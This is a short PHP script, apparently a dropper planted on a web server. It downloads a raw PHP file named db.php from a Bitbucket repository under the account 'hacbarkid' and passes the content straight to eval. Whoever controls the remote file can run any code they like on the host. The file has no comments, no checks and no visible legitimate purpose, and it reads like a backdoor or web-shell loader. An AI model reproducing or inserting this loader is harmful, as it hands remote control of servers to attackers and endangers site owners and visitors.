<?php
    $Url = "https://bitbucket.org/hacbarkid/maybey/raw/51503c8367de9c4e529d91091874692bc9d7dded/db.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);

?>